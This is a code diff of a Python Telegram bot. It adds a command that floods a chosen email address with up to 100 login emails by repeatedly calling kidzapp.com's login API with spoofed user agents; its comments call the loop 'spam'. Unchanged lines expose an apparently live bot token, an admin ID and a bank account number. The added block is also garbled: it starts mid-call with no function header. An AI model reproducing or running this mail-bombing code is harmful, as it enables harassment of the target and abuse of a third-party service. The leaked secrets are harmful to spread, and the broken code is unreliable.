@@ -82,7 +82,7 @@ BOT_TOKEN = "8415663762:AAH1CZX9hJ_qtIoT_X72UW8DW5uIm5M1P1s"
 ADMIN_ID = 6683331082
 DB_FILE = "ff_bot_data.json"
 TOKEN_LOG = "access_tokens.txt"
-VERSION = "5.6.4"
+VERSION = "5.6.5"
 VIP_CONTACT = "@liggdzut1"
 
 BANK_STK = "0368925982"
@@ -520,6 +520,76 @@ async def luan_request(endpoint: str, params: dict) -> dict:
         except Exception as e:
             return {"status": "error", "message": str(e)}
 
+
+parse_mode=ParseMode.MARKDOWN_V2
+        )
+
+    email = ctx.args[0].strip()
+    
+    # 3. Xử lý số lần spam (mặc định là 1 nếu không nhập hoặc nhập sai)
+    count = 1
+    if len(ctx.args) > 1:
+        try:
+            count = int(ctx.args[1])
+            # Giới hạn để tránh treo bot (ví dụ max 20 lần)
+            if count > 100: count = 100 
+        except ValueError:
+            count = 10
+
+    import requests
+    from user_agent import generate_user_agent
+
+    success = 0
+    fail = 0
+
+    # Thông báo bắt đầu
+    status_msg = await get_reply(update).reply_text(
+        f"```\n🚀 Đang gửi {count} yêu cầu tới {email}...\n```",
+        parse_mode=ParseMode.MARKDOWN_V2
+    )
+
+    # 4. Vòng lặp Spam
+    for i in range(count):
+        headers = {
+            'accept': 'application/json, text/plain, */*',
+            'content-type': 'application/json',
+            'origin': 'https://kidzapp.com',
+            'referer': 'https://kidzapp.com/',
+            'user-agent': str(generate_user_agent()),
+        }
+        json_data = {
+            'email': email,
+            'sdk': 'web',
+            'platform': 'desktop',
+        }
+
+        try:
+            # Nên dùng session hoặc gán biến response để tối ưu
+            response = requests.post(
+                'https://api.kidzapp.com/api/3.0/customlogin/',
+                headers=headers,
+                json=json_data,
+                timeout=10
+            )
+            
+            if '"EMAIL SENT"' in response.text:
+                success += 1
+            else:
+                fail += 1
+        except Exception:
+            fail += 1
+
+    # 5. Kết quả cuối cùng
+    final_msg = (
+        f"```\n"
+        f"📧 Email: {email}\n"
+        f"✅ Thành công: {success}\n"
+        f"❌ Thất bại: {fail}\n"
+        f"🏁 Hoàn tất!\n"
+        f"```"
+    )
+    
+    await status_msg.edit_text(final_msg, parse_mode=ParseMode.MARKDOWN_V2)
 
 # ══════════════════════════════════════════════════════
 #               BALANCE HELPERS
